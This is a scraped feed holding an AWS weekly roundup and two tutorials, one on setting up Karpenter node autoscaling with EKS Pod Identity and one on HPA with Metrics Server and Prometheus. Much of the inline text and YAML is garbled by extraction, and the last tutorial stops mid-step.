items.title: AWS Weekly Roundup: Amazon Q CLI agent, AWS Step Functions, AWS Lambda, and more (March 10, 2025)
items.author: Danilo Poccia
items.content:
Another busy week, here are the launches that got my attention.

– Introducing Amazon GameLift Streams, a new managed capability that developers can use to stream games at up to 1080p resolution and 60 frames per second to any device with a WebRTC-enabled browser. To learn more, explore Donnie’s blog post.

Here are some additional projects, blog posts, and news items that you might find interesting:

Accelerate AWS Well-Architected reviews with Generative AI – In this post, we explore a generative AI solution to streamline the Well-Architected Framework Reviews (WAFRs) process. We demonstrate how to build an intelligent, scalable system that analyzes architecture documents and generates insightful recommendations based on best practices.

Here are some of my favorite posts from community.aws. Create your AWS Builder ID to start sharing your tips and connect with fellow builders. Your Builder ID is a universal login credential that gives you access, beyond the AWS Management Console, to AWS tools and resources, including over 600 free training courses, community features, and developer tools such as Amazon Q Developer.

Check your calendars and sign up for these upcoming AWS events:

AWS Innovate: Generative AI + Data – Join a free online conference focusing on generative AI and data innovations. Available in multiple geographic regions: North America (March 13), Greater China Region (March 14), and Latin America (April 8).

AWS Summits – The AWS Summit season is coming along! Join free online and in-person events that bring the cloud computing community together to connect, collaborate, and learn about AWS. Register in your nearest city: Paris (April 9), Amsterdam (April 16), London (April 30), and Poland (May 5).

AWS re:Inforce (June 16–18) – Our annual learning event devoted to all things AWS Cloud security. This year is in Philadelphia, PA. Registration opens in March, so be ready to join more than 5,000 security builders and leaders.

AWS DevDays are free, technical events where developers can learn about some of the hottest topics in cloud computing. DevDays offer hands-on workshops, technical sessions, live demos, and networking with AWS technical experts and your peers. Register to access AWS DevDays sessions on demand.

That’s all for this week. Check back next Monday for another Weekly Roundup!

This post is part of our Weekly Roundup series. Check back each week for a quick roundup of interesting news and announcements from AWS!

(This survey is hosted by an external company. AWS handles your information as described in the AWS Privacy Notice. AWS will own the data gathered via this survey and will not share the information collected with survey respondents.)

items.title: Karpenter Node Autoscaling with Pod Identity in AWS
items.author: Ramksai
items.content:
Kubernetes has become the standard for container orchestration, but managing compute resources efficiently remains a crucial challenge. Autoscaling plays a vital role in ensuring that workloads receive the right amount of compute power while keeping costs under control.

Karpenter is an advanced node provisioning system that helps Kubernetes clusters scale nodes dynamically and efficiently. With the release of , it has become a stable and native solution for AWS, integrating tightly with AWS services like , which enhances security by managing IAM permissions at the pod level instead of relying on node-wide IAM roles.

To fully understand Karpenter 1.0 with Pod Identity, let’s first explore the concept of , how it differs from , and what benefits it brings in terms of cost efficiency, optimal resource utilization, and scalability.

What is Node Autoscaling?

Node autoscaling is the process of automatically adjusting the number of worker nodes in a Kubernetes cluster based on resource demand. When workloads require more compute capacity, new nodes are provisioned, and when workloads scale down, underutilized nodes can be removed to save costs.

How Node Autoscaling Works in Kubernetes

Kubernetes supports node autoscaling primarily through two mechanisms:

  1.  — The traditional way of scaling nodes using AWS Auto Scaling Groups (ASGs). It monitors pending pods and adjusts node count accordingly.
  2.  — A more modern and efficient autoscaler that dynamically provisions nodes based on workload demands without relying on ASGs.

Karpenter is designed to be and than the Cluster Autoscaler because it provisions nodes on demand, rather than relying on predefined node groups.

Difference Between Pod Autoscaling and Node Autoscaling

  • Pod Autoscaling (HPA/VPA) is focused on adjusting the number of based on CPU/memory usage. It ensures application performance but doesn’t manage cluster capacity.
  • Node Autoscaling (Karpenter/Cluster Autoscaler) is focused on adjusting the number of to accommodate the pod demand.

While both are crucial, Karpenter provides more intelligent node autoscaling with real-time provisioning of the right node type, leading to better resource optimization.

What We Can Achieve with Karpenter?

Karpenter helps save costs by:

  • Launching instead of predefined fixed-size nodes.
  • onto fewer nodes during low demand.
  • Scaling down unused nodes dynamically.
  • for cost savings when workloads allow.

2. Improved Resource Utilization

  • Traditional ASG-based scaling often leads to overprovisioning, resulting in idle resources.
  • Karpenter ensures of workloads onto fewer nodes, minimizing wastage.

3. Faster Scaling and Response to Workloads

  • relies on ASGs and can be slow to scale.
  • Karpenter provisions nodes instantly as soon as there is pod demand, ensuring faster response times.

4. Right Cluster Resources for Workloads

  • Karpenter can automatically select instance types that best match workload requirements (CPU, memory, GPU).
  • Instead of relying on a static set of node types, it based on real-time needs.

5. Native AWS Integration

  • Karpenter works seamlessly with AWS services like EC2, EBS, Spot Instances, and IAM roles.
  • Unlike Cluster Autoscaler, which depends on ASGs, Karpenter directly provisions EC2 instances via the AWS API.
  • It supports AWS Nitro-based instances for improved security and performance.

Setting Up Karpenter 1.0 with Pod Identity

One of the major improvements in is its ability to integrate with instead of traditional node IAM roles.

Why Use Pod Identity with Karpenter?

  • Traditional node-based IAM roles grant permissions to the entire node, exposing all pods to those privileges.
  • With , permissions are granted only to the specific pod running Karpenter, following the least privilege principle.
  • Better Management of IAM Permissions:
  • No need to create large IAM roles for EC2 instances.
  • IAM policies are bound directly to the Karpenter pod, reducing security risks.
  • :
  • Works natively with AWS IAM Roles for Service Accounts (IRSA).
  • Karpenter dynamically provisions nodes with the required IAM roles.

Installation Steps Karpenter with Pod Identity?

The installation process involves: Pod Identity works with Amazon EKS Cluster (version 1.25 and above)

  1. Enable Pod Identity Agent in EKS Cluster
  2. Creating an AWS IAM Role for Karpenter with Pod Identity
  3. Installing Karpenter in the EKS Cluster
  4. Configuring Node Provisioners
  5. Testing Autoscaling with Workloads

Step 1: Enable AWS Pod Identity Agent Add-on

AWS allows Kubernetes workloads to assume IAM roles securely without relying on instance-level IAM roles. This is essential for running with fine-grained access control.

1.1 Check Available Add-ons for EKS 1.31

Before enabling , confirm if the add-on is available for your cluster:

aws eks describe-addon-versions --addon-name aws-pod-identity-agent

1.2 Install the Pod Identity Agent Add-on

Run the following command to enable the add-on in your cluster:

aws eks create-addon --cluster-name CLUSTER-NAME\  --addon-name aws-pod-identity-agent \

Replace ClUSTER-NAME with your actual EKS cluster name and update the AWS accordingly.

We can also enable PodIdentity in AWS Console. . Open AWS Console → Navigate to Amazon EKS.

. Select your EKS 1.31 Cluster from the list.

. Click on the Add-ons tab.

. Click “Get more add-ons”.

. Search for AWS Pod Identity Agent.

. Click Install and select the appropriate version.

. Confirm the installation and wait for it to complete.

1.3 Verify Add-on Installation

Once installed, verify that the add-on is active:

aws eks describe-addon --cluster-name eks-cluster-1-31 --addon-name aws-pod-identity-agent

If successful, you should see in the output. You can verify that the EKS Pod Identity Agent pods are running in your cluster using the following kubectl command:

kubectl get pods -n kube-system | grep 'eks-pod-identity-agent'

Expected output should show running pods similar to:

aws-pod-identity-agent-xyz12   1/1   Running   0   2maws-pod-identity-agent-abc34   1/1   Running   0   2m

If the pods are not running, check logs for troubleshooting:

kubectl logs -n kube-system -l app.kubernetes.io/name=aws-pod-identity-agent

Step 2: Creating the Necessary IAM Roles with CloudFormation

To enable Karpenter to provision and manage EC2 instances within your EKS cluster, you’ll need to create specific IAM roles. CloudFormation provides a streamlined method for this process.

  1. Download the CloudFormation Template: Obtain the CloudFormation template from the official Karpenter documentation. This template defines the necessary IAM roles and policies.
curl -fsSL https://karpenter.sh/v0.32.1/getting-started/getting-started-with-karpenter/cloudformation.yaml > karpenter-config-file.yaml

2. Create the CloudFormation Stack: Use the AWS CLI to deploy the CloudFormation template. This will create the IAM roles required for Karpenter to function correctly.

aws cloudformation create-stack \  --stack-name Karpenter-${CLUSTER_NAME} \
  --template-body file://karpenter-cf.yaml \
  --capabilities CAPABILITY_NAMED_IAM \    ParameterKey=ClusterName,ParameterValue=${CLUSTER_NAME} \
    ParameterKey=ControllerRegion,ParameterValue=${AWS_REGION}
  • --stack-name: Provides a unique name for your CloudFormation stack (e.g., Karpenter-my-eks-cluster).
  • --template-body: Specifies the path to the downloaded CloudFormation template file.
  • --capabilities CAPABILITY_NAMED_IAM: Acknowledges that the CloudFormation template will create IAM resources. This is a required parameter.
  • --parameters: Allows you to override parameters defined in the CloudFormation template. In this case, you're specifying your EKS cluster name (ClusterName) and AWS region (ControllerRegion).

The CloudFormation template will generate the following key components:

  • KarpenterNodeRole: This IAM role is assigned to the EC2 instances that Karpenter provisions. It grants these instances the necessary permissions to join the EKS cluster, pull container images, and perform other essential tasks. This role includes managed policies such as:
  • AmazonEKS_CNI_Policy: Allows the nodes to participate in the EKS networking.
  • AmazonEKSWorkerNodePolicy: Grants basic worker node permissions for interacting with the EKS control plane.
  • AmazonEC2ContainerRegistryReadOnly: Provides read-only access to Amazon ECR for pulling container images.
  • AmazonSSMManagedInstanceCore: Enables SSM Agent for management via Systems Manager.
  • KarpenterControllerPolicy: This IAM policy defines the permissions for the Karpenter controller itself. It allows the controller to manage EC2 instances, IAM roles, and other AWS resources required for autoscaling.
  • KarpenterControllerRole: This IAM role is assumed by the Karpenter controller pod running in your cluster. It’s linked to the KarpenterControllerPolicy, granting the controller the necessary permissions. The trust relationship on this role is configured to allow the Karpenter service account to assume it.

Step 3: Installing Karpenter in the EKS Cluster

To install Karpenter in your EKS cluster using Helm, follow these steps:

Add the Karpenter Helm repository:

helm repo add karpenter https://charts.karpenter.shhelm repo update

Install Karpenter using the following Helm command:

helm upgrade --install karpenter oci://public.ecr.aws/karpenter/karpenter \  --version "${KARPENTER_VERSION}" \  --create-namespace \
  --set "settings.clusterName=${CLUSTER_NAME}" \
  --set "settings.interruptionQueue=${CLUSTER_NAME}" \
  --set controller.resources.requests.cpu=1 \
  --set controller.resources.requests.memory=1Gi \
  --set controller.resources.limits.cpu=1 \
  --set controller.resources.limits.memory=1Gi \
  • Installs Karpenter in the “karpenter” namespace
  • Sets the cluster name and interruption queue
  • Configures resource requests and limits for the Karpenter controller
  • Waits for the installation to complete before proceeding
kubectl get pods -n karpenter
NAME                        READY   STATUS    RESTARTS   AGE
karpenter-rgn746480-fdqtd   1/1     Running   0          4h47m
karpenter-rgn746480-fbgdd   1/1     Running   0          4h47m

You should see Karpenter pods running in the output.

Check the Karpenter deployment:

kubectl get deployment -n karpenter
NAME        READY   UP-TO-DATE   AVAILABLE   AGE
karpenter   2/2     2            2           2d

Ensure the deployment is available and ready.

Step 4: Configuring Node Provisioners

To configure the Node Provisioners. Karpenter will relay on two components.

In Kubernetes, a node pool is a collection of nodes that share the same configuration, including instance type, availability zone, and other settings. In Karpenter, node pools are a way to define the characteristics and configurations of the worker nodes it provisions. Karpenter’s node pool functionality is closely tied to the EC2NodeClass resource, which defines the configuration for EC2 instances that Karpenter provisions on-demand to meet the needs of Kubernetes workloads.

Karpenter leverages the resource to manage node pools. This resource defines the EC2 instances’ characteristics, such as instance type, subnets, and security groups, as well as other configurations like spot instances for cost savings. The EC2NodeClass allows Karpenter to automatically create and manage EC2 instances without the need for static node groups or Auto Scaling Groups (ASGs). Instead, Karpenter makes real-time decisions to provision nodes based on workload demands.

4.1 Configuring Karpenter in the EKS Cluster

You can configure Karpenter to provision EC2 instances using below 2 methods. (by tagging subnets and security groups) (by defining subnets and SGs directly in the EC2NodeClass)

Lets discuss more about these two methods and where it can be used.

Method 1: Tagging Subnets and Security Groups (for a Single Cluster)

In this method, we tag the subnets and security groups to allow Karpenter to discover and use the appropriate resources. This method is ideal when each subnet and SG is only used by a single cluster.

  1. : Set the environment variables for your cluster name, AWS account ID, and AWS region.
CLUSTER_NAME="cluster-name-here" AWS_ACCOUNT_ID="aws-account-id-here" 
AWS_REGION="aws-region-here"

: You will need to tag your subnets with the Karpenter discovery tag. This step allows Karpenter to identify and use those subnets for provisioning instances.

aws ec2 create-tags --resources ${SUBNET_ID} --tags Key=karpenter.sh/discovery,Value=${CLUSTER_NAME} --region ${AWS_REGION}
  • Replace ${SUBNET_ID} with the actual subnet ID.
  • The karpenter.sh/discovery tag helps Karpenter discover the subnet and associate it with the cluster.

: Similarly, tag your security groups with the discovery tag to let Karpenter know which security group to use when provisioning nodes.

aws ec2 create-tags --resources ${SG_ID} --tags Key=karpenter.sh/discovery,Value=${CLUSTER_NAME} --region ${AWS_REGION}

Replace ${SG_ID} with the security group ID.

4. Cluster-Specific Configuration: Now that the subnets and security groups are tagged, Karpenter can automatically discover these resources for use in provisioning EC2 instances for the specific cluster.

  • : Use this method if your subnets and security groups are . This ensures proper discovery by Karpenter without needing to define resources in the .

Method 2: Defining Subnets and Security Groups in EC2NodeClass (for Multiple Clusters)

In this method, you define the subnets and security groups directly in the configuration for the cluster(s). This is the preferred method when the same subnets and security groups are used by .

  1. for each cluster: Define an EC2NodeClass configuration for each cluster. You will explicitly define the subnets and security groups in the configuration to avoid relying on tags.
apiVersion: karpenter.sh/v1alpha5kind: EC2NodeClass  name: cluster1-nodeclass  instanceType: m5.large    - subnet-0123456789abcdef  # Subnet 1
    - subnet-012dddkkdkkkcdef  # Subnet 2
    - subnet-01djkdkkk9abcdef  # Subnet 3    - sg-0123456789abcdef      # Security Group 1
  • Replace subnet1,2,3 with your actual subnet ID.
  • Replace sg-0123456789abcdef with your actual security group ID.

2. Repeat for Other Clusters: For each cluster (Cluster 2, Cluster 3, etc.), repeat the EC2NodeClass definition with the same subnets and security groups, as shown below:

apiVersion: karpenter.sh/v1alpha5kind: EC2NodeClass  name: cluster2-nodeclass  instanceType: m5.large    - subnet-0123456789abcdef  # Subnet 1
    - subnet-012dddkkdkkkcdef  # Subnet 2
    - subnet-01djkdkkk9abcdef  # Subnet 3    - sg-0123456789abcdef      # Security Group 1

3. Karpenter Configuration: Karpenter will use the EC2NodeClass resource to discover and provision instances based on the subnets and security groups defined in each configuration. Since all clusters are using the same subnets and security groups, you don’t need to rely on tagging for resource discovery.

: This method is ideal when (Cluster 1 to Cluster 5) share the same subnets and security groups. By directly defining these resources in the , you ensure that each cluster has the correct configuration for provisioning instances without any overlap or reliance on tagging.

Let’s continue to setup EC2NodeClass & NodePools. Sorry for the long explanation :)

Here I am taking Method2: Setting Up EC2NodeClass and NodePools in Karpenter

apiVersion: karpenter.k8s.aws/v1kind: EC2NodeClass  name: default-nodeclass  amiFamily: AL2  # Amazon Linux 2    - id: subnet-0a12b345c67d890f1  # Subnet 1 ID
    - id: subnet-0b23c456d78e901g2  # Subnet 2 ID
    - id: subnet-0c34d567e89f012h3  # Subnet 3 ID
  securityGroupSelectorTerms:
    - tags:
        karpenter.sh/discovery: default-cluster
    - tags:
        Purpose: main-EKS-SG-Karpenter-nodes  # Your custom security group tag
  role: KarpenterNodeRole-${CLUSTER_NAME}  # IAM role for EC2 instances
  • amiFamily: Specifies the AMI family, which is set to in this case.
  • subnetSelectorTerms: This specifies the three subnets where the Karpenter node instances will be provisioned. Replace these IDs with your actual subnet IDs.
  • securityGroupSelectorTerms: This specifies the security group that should be applied to the instances. The Purpose tag identifies the security group.
  • role: The IAM role that Karpenter will assume to manage EC2 instances.

After writing the configuration for the EC2NodeClass, apply it to your cluster:

kubectl apply -f ec2-nodeclass.yaml
ec2nodeclass.karpenter.k8s.aws/default-nodeclass created

Verify EC2NodeClass Creation

kubectl get ec2nodeclass
NAME                  AGE
default-nodeclass      5m

Now that we have the created, we can proceed to define the that references this EC2NodeClass. The NodePool will define the resource requirements and scale parameters.

Here’s an example configuration for a that uses the EC2NodeClass and defines basic requirements, including instance family and availability zone selection.

apiVersion: karpenter.sh/v1kind: NodePool  name: default-nodepool  template:      labels:    spec:        name: default-nodeclass  # Reference to the EC2NodeClass        - key: "karpenter.k8s.aws/instance-family"          values: ["m5", "t3"]
        - key: "topology.kubernetes.io/zone"
          operator: In
          values: ["us-west-2a", "us-west-2b", "us-west-2c"]
      taints:
        - key: "karpenter.k8s.aws/critical"
          value: "true"
          effect: NoSchedule  # Tainting the node to schedule only critical workloads
  limits:
    cpu: 1000  # Limit on CPU resources that can be requested
  disruption:
    consolidationPolicy: WhenEmptyOrUnderutilized
    consolidateAfter: 1m      - nodes: 10%  # Deprovision only 10% of nodes when underutilized
      # On Weekdays during business hours, don't do any deprovisioning.
      - schedule: "0 9 * * mon-fri"        nodes: "2"  # Do not deprovision more than 2 nodes during this time window
  • nodeClassRef: References the previously created EC2NodeClass (with subnets and security groups).
  • requirements: Specifies the instance families (e.g., m5, t3) and the availability zones (us-west-2a, us-west-2b, us-west-2c).
  • limits: Defines a limit on the CPU resources the NodePool can request.
  • consolidationPolicy: Specifies when Karpenter should consolidate nodes (i.e., remove nodes from the cluster). Here, it will consolidate when empty or underutilized.
  • consolidateAfter: Consolidates nodes after the last node in the node pool is empty or underutilized.
  • budgets: Controls how many nodes can be deprovisioned. The first budget allows deprovisioning of nodes in the pool. The second budget prevents deprovisioning more than during business hours on weekdays.
  • The taint ensures that only can be scheduled on the nodes of this pool. It uses the NoSchedule effect, meaning non-critical workloads will not be scheduled on nodes with this taint.

Apply the NodePool Configuration

kubectl apply -f nodepool.yaml
nodepool.karpenter.sh/default-nodepool created

This will create the NodePool and allow Karpenter to manage node provisioning based on the defined configurations.

Verify NodePools Creation

kubectl get nodepool
NAME                  AGE
default-nodepool      1m

Step 5: Testing the Setup

After the and are configured, it’s important to test whether Karpenter provisions nodes as expected.

To check if nodes are being provisioned automatically by Karpenter, run:

kubectl get nodes
NAME                                          STATUS   ROLES    AGE   VERSION
ip-192-168-0-15.us-west-2.compute.internal   Ready    <none>   10m   v1.21.5
ip-192-168-0-16.us-west-2.compute.internal   Ready    <none>   8m    v1.21.5

This will the nodes that Karpenter has provisioned. You should see new EC2 instances corresponding to your configuration, located in the specified subnets.

Test Scaling with Resource-Heavy Pod:

  1. To test automatic scaling, you can create a pod that requires more CPU resources, which will trigger Karpenter to provision additional nodes.
  2. Example resource-heavy pod:
apiVersion: apps/v1kind: ReplicaSet  name: load-test-replicaset  replicas: 1 # Scaling up the pod count to trigger more node provisioning    matchLabels:  template:      labels:    spec:      - name: busybox        command: ["sh", "-c", "while true; do echo hello; sleep 10; done"]          requests:          limits:
kubectl apply -f stress-test-pod.yaml
kubectl get pods -o wide
NAME                   READY   STATUS    RESTARTS   AGE   IP          NODE                                NOMINATED NODE
load-test-replicaset    1/1     Running   0          1m    192.168.1.10  ip-192-168-0-15.us-west-2.compute.internal   <none>

8. When Karpenter provisions new nodes, you will see additional nodes being added to the cluster. To simulate this, you can create more resource-heavy pods or scale up the existing ones.

Let’s simulate resource pressure by creating more pods

kubectl scale replicaset load-test-replicaset --replicas=5
replicaset.apps/load-test-replicaset scaled

If everything is configured correctly, Karpenter will detect the resource demand and provision additional EC2 instances as needed.

9. Observe the nodes, Nodes will spin up

NAME               READY   STATUS    RESTARTS   AGE   IP          NODE                                          NOMINATED NODEload-test-pod-1    1/1     Running   0          5m    192.168.1.11 ip-192-168-0-15.us-west-2.compute.internal   <none>
load-test-pod-2    1/1     Running   0          5m    192.168.1.12 ip-192-168-0-16.us-west-2.compute.internal   <none>
load-test-pod-3    1/1     Running   0          5m    192.168.1.13 ip-192-168-0-17.us-west-2.compute.internal   <none>
load-test-pod-4    1/1     Running   0          5m    192.168.1.14 ip-192-168-0-17.us-4west-2.compute.internal   <none>
load-test-pod-5    1/1     Running   0          5m    192.168.1.15 ip-192-168-0-17.us-west-2.compute.internal   <none>

10. Verify Scaling in Action

To see the scaling behavior more clearly, you can also describe the nodes and monitor the scaling activity.

For example, describe the newly provisioned node to check its status and verify if the node is appropriately registered:

kubectl describe node ip-192-168-0-17.us-west-2.compute.internal
Name:               ip-192-168-0-17.us-west-2.compute.internalRoles:              <none>
Labels:             karpenter.k8s.aws/instance-family=m5
                    topology.kubernetes.io/zone=us-west-2cTaints:             karpenter.k8s.aws/critical=true:NoSchedule
Unschedulable:      false
...

The node is in the Ready state and has the applied. Karpenter will manage the node scaling based on resource needs.

11. Once we scale down the replica count in the ReplicaSet to 1(or any desired value). This will reduce the demand for resources and trigger Karpenter to scale down the nodes if the pods are underutilized.

Run the following command to scale down the ReplicaSet:

kubectl scale replicaset load-test-replicaset --replicas=2
replicaset.apps/load-test-replicaset scaled

12. Verify Node Decommissioning

After the scaling down process, check the list of nodes to ensure that the unneeded nodes have been removed from the cluster.

Run the following command to verify the current list of nodes in your cluster:

kubectl get nodes
NAME                                         STATUS   ROLES    AGE   VERSION
ip-192-168-0-17.us-west-2.compute.internal   Ready    <none>   10m   v1.21.0
ip-192-168-0-18.us-west-2.compute.internal   Ready    <none>   10m   v1.21.0
ip-192-168-0-19.us-west-2.compute.internal   Ready  <none>   10m   v1.21.0
ip-192-168-0-15.us-west-2.compute.internal   Terminated   <none>   10m   v1.21.0   # This node has been deprovisioned
ip-192-168-0-16.us-west-2.compute.internal   Terminated   <none>   10m   v1.21.0   # This node has been deprovisioned

In this example, you can see that the nodes ip-192-168-0-15 and ip-192-168-0-16 have been terminated after the scaling down operation.

13. Verify Pod Distribution

After the nodes are decommissioned, the remaining pods will be redistributed to the available nodes. You can verify the pod distribution by running the following command:

kubectl get pods -o wideNAME                        READY   STATUS    RESTARTS   AGE   IP          NODE                                           NOMINATED NODE
load-test-pod-1             1/1     Running   0          10m   192.168.1.11 ip-192-168-0-17.us-west-2.compute.internal   <none>
load-test-pod-2             1/1     Running   0          10m   192.168.1.12 ip-192-168-0-18.us-west-2.compute.internal   <none>
load-test-pod-3             1/1     Running   0          10m   192.168.1.13 ip-192-168-0-19.us-west-2.compute.internal   <none>

Step 5: Monitoring and Debugging

If the node provisioning does not work as expected, you can:

  1. to diagnose issues:
kubectl logs -n karpenter -l app=karpenter

in the AWS Console to ensure they are being created in the correct subnets and security groups.

items.title: Understanding and Setting Up HPA with Metrics Server, Prometheus, and Prometheus Adapter in EKS
items.author: Ramksai
items.content:
Kubernetes provides powerful scaling mechanisms to ensure applications can handle varying workloads efficiently. One of the key features is , which dynamically adjusts resources based on demand. There are two primary types of autoscaling in Kubernetes:

  1. : Ensures that the cluster itself can scale by adding or removing worker nodes. This is managed by tools like or in AWS EKS.
  2. : Adjusts the number of pods in a deployment based on CPU, memory, or custom metrics. This is done using Horizontal Pod Autoscaler (HPA) or Vertical Pod Autoscaler (VPA).

Node-Based vs. Pod-Based Autoscaling

Node-Based vs. Pod-Based Autoscaling in Kubernetes

Kubernetes provides two primary scaling mechanisms:

  • (scaling infrastructure by adding/removing nodes).
  • (scaling application pods dynamically).

Node-Based vs. Pod-Based Autoscaling in Kubernetes

Kubernetes provides two primary scaling mechanisms:

  • (scaling infrastructure by adding/removing nodes).
  • (scaling application pods dynamically).

1. Node-Based Autoscaling

  • adjusts the number of worker nodes in a Kubernetes cluster based on resource demand.
  • In AWS EKS, this is achieved using or Cluster Autoscaler (CA) with Auto Scaling Groups (ASGs).

How Node Autoscaling Works in AWS?

There are two primary ways to scale nodes in AWS EKS:

1️⃣ Using Cluster Autoscaler (CA) with AWS Auto Scaling Groups

  • (CA) monitors pending pods and requests new nodes from an when needed.
  • Works well with EC2-based managed node groups in EKS.
  • Scales nodes up when pods cannot be scheduled due to insufficient resources.
  • Scales nodes down when nodes are underutilized.

📌 Cluster Autoscaler Setup:

2️⃣ Using Karpenter for Node Autoscaling

  • is a newer and more flexible autoscaler that directly provisions nodes when required.
  • It does not rely on Auto Scaling Groups and can provision instances dynamically.
  • Works well with and in AWS.
  • Faster and more efficient than Cluster Autoscaler in many cases.

When to Use Node Autoscaling?

✅ When workloads require additional compute capacity (new nodes).✅ When running or workloads with unpredictable demand.✅ When scaling Kubernetes clusters in cloud environments like AWS, GCP, and Azure.

  • dynamically adjusts the number of pods in a deployment or StatefulSet based on workload demand.
  • Managed using Horizontal Pod Autoscaler (HPA) and Vertical Pod Autoscaler (VPA).

HPA (Horizontal Pod Autoscaler)

  • Increases or decreases the based on resource utilization.
  • Uses CPU, memory, or custom external metrics (Prometheus, CloudWatch, etc.) to scale workloads dynamically.
  •  — pods are added or removed while running.
apiVersion: autoscaling/v2kind: HorizontalPodAutoscaler  name: cpu-hpaspec:    apiVersion: apps/v1    name: my-app  maxReplicas: 10  - type: Resource      name: cpu        type: Utilization

🔹 ✅ Best for stateless workloads like web applications, APIs, and microservices.✅ Ideal when traffic fluctuates throughout the day. by removing unused pods.

VPA (Vertical Pod Autoscaler)

  • Adjusts CPU and memory requests/limits for pods instead of scaling pod count.
  • Can automatically increase pod resource allocations based on demand.
  • Requires to apply new resource limits.
apiVersion: autoscaling.k8s.io/v1kind: VerticalPodAutoscaler  name: vpa-examplespec:    apiVersion: "apps/v1"    name: my-app    updateMode: "Auto"

🔹 ✅ Best for stateful applications like databases, Redis, and AI workloads.✅ Useful when pod resource consumption is and needs automatic adjustment.❌ Not recommended for web applications since it , causing downtime.

Comparison: HPA vs. VPA vs. Node Autoscaler

  • ✅ when you need for microservices, APIs, and web workloads.
  • ✅ when your workload’s CPU and memory needs change dynamically, like databases and ML workloads.
  • ✅ when your cluster runs out of nodes to schedule pods.

🚀 👉 HPA for application scaling (with CPU, memory, and Prometheus metrics).👉 VPA for stateful workloads that need optimized resource allocation.👉 Karpenter or Cluster Autoscaler for infrastructure scaling in AWS.

Understanding and Setting Up HPA in a Production-Like Kubernetes Cluster for EKS setup? 🎯

  • in our .
  • A sample production application deployed in the namespace .
  • The application starts with , but we want it to scale dynamically when traffic increases.
  1. Kubernetes Metrics Server/ Metric Adapter and Prometheus.
  2. for our application.
  3. to trigger autoscaling.
  4. Observe HPA scaling behavior as pods increase from .

Step 1: Understanding the Components

Before we begin, let’s define the key components:

is a lightweight, scalable solution that collects CPU and memory usage from Kubernetes nodes and pods. It provides real-time metrics via the and is essential for Kubernetes Horizontal Pod Autoscaler (HPA) to function.

  • Kubernetes pods without live resource utilization metrics.
  • The default Kubernetes installation does NOT include a Metrics Server.
  • Commands like kubectl top nodes and kubectl top pods rely on it.
  • Metrics Server fetches CPU and memory usage from Kubelet on each node.
  • It store metrics persistently (unlike Prometheus).
  • The HPA queries Metrics Server for live resource metrics to decide if scaling is needed.

kube-metrics-adapter bridges Prometheus metrics with Kubernetes' custom metrics API. It enables HPA to scale based on custom application metrics like:

    • Metrics Server only provides CPU & memory metrics.
    • HPA needs a way to use Prometheus metrics for scaling.
    • kube-metrics-adapter converts Prometheus metrics into Kubernetes API-compatible custom metrics.
    1. The adapter for custom metrics.
    2. It under custom.metrics.k8s.io.
    3. HPA and adjusts pod replicas accordingly.

    is a powerful monitoring and alerting system that stores and queries time-series data, including custom application metrics. It acts as a for custom Kubernetes metrics.

    • Metrics Server only provides CPU and memory metrics.
    • To scale on (like request rate, queue length), we need Prometheus.
    • It stores data for analysis and troubleshooting.
    • Prometheus scrapes metrics from Kubernetes components and applications.
    • It exposes these metrics via an HTTP API.
    • The kube-metrics-adapter fetches Prometheus metrics and makes them available to HPA.

    Before setting up HPA, let’s first understand the role of Metrics Server, Prometheus, and Prometheus Adapter in autoscaling.

    Installing and Configuring Kubernetes Metrics Server, Kube Metrics Adapter, and Prometheus

    Step 1: Install Metrics Server

    kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml
    kubectl get deployment metrics-server -n kube-systemkubectl get pods -n kube-system | grep metric-server

    ✅ If metrics-server is running, the installation is successful!

    Step 2: Install Prometheus for Metrics Collectionusing Helm

    helm repo add prometheus-community https://prometheus-community.github.io/helm-chartshelm repo update
    helm install prometheus prometheus-community/kube-prometheus-stack --namespace monitoring --create-namespace

    Verify Prometheus Installation

    kubectl get pods -n monitoring | grep prometheus

    ✅ If Prometheus pods are running, the installation is successful!

    Port-Forward Prometheus UI

    kubectl port-forward svc/prometheus-kube-prometheus-prometheus 9090 -n monitoring

    Step 3: Install Kube Metrics Adapter

    helm install kube-metrics-adapter prometheus-community/prometheus-adapter -n monitoring

    Verify Kube Metrics Adapter Installation

    kubectl get pods -n monitoring | grep kube-metrics-adapter

    ✅ If the adapter pod is running, it is correctly installed!

    Step 4: Configure Kube Metrics Adapter with Prometheus Host Details

    By default, Kube Metrics Adapter connects to Prometheus using a service name inside the cluster. However, you can explicitly set the Prometheus host if needed.

    Identify Prometheus Service Name

    Run the following command to get the Prometheus service:

    kubectl get svc -n monitoring

    You should see something like this:

    NAME                                             TYPE        CLUSTER-IP      PORT(S)          prometheus-kube-prometheus-prometheus            ClusterIP   10.100.200.10   9090/TCP

    Here, the Prometheus service is:prometheus-kube-prometheus-prometheus.monitoring.svc.cluster.local

    values.yaml for Kube Metrics Adapter

    Modify your values.yaml to explicitly define the Prometheus host:

    prometheus:  url: "http://prometheus-kube-prometheus-prometheus.monitoring.svc.cluster.local:9090"  path: "/"
    rules:  default: true    - seriesQuery: 'http_requests_total'        overrides:
              namespace: {resource: "namespace"}
              pod: {resource: "pod"}        matches: "^(.*)_total"      metricsQuery: "rate(<<.Series>>[2m])"
    helm upgrade --install kube-metrics-adapter prometheus-community/prometheus-adapter -f values.yaml --namespace monitoring

    Verify Metrics Adapter Connection

    Check if it is exposing metrics correctly:

    kubectl get --raw "/apis/custom.metrics.k8s.io/v1beta1"

    ✅ If the output contains a list of metrics, it is successfully connected to Prometheus!

    How Does Kube Metrics Adapter Connect to Prometheus?

    By default, the kube-metrics-adapter queries Prometheus using its internal Kubernetes DNS name:

    --prometheus-server=https://prometheus.istio-system.svc.cluster.local

    Why Use Internal DNS Instead of Route 53?

    ✔  — Everything stays inside the cluster.✔  — Prometheus metrics are not exposed externally.✔ Automatic service discovery — Kubernetes resolves the service internally.

    When Should You Use Route 53 Instead?

    • If your Prometheus instance is outside the cluster (e.g., AWS Managed Prometheus, another AWS VPC).
    • In this case, configure the kube-metrics-adapter to use an external Route 53 DNS name:
    --prometheus-server=https://prometheus.mycompany.com

    🔹 If you already have a DNS entry (e.g., Route 53, internal VPC DNS), use that instead of the local Kubernetes service name.

    Step 5: Configure HPA to Use Custom Metrics

    Example: Create HPA Using HTTP Requests as a Custom Metric

    1️⃣ Deploy a Sample Application

    kubectl create deployment nginx --image=nginx --replicas=2kubectl expose deployment nginx --type=ClusterIP --port=80

    2️⃣ Create HPA Resource (hpa.yaml)

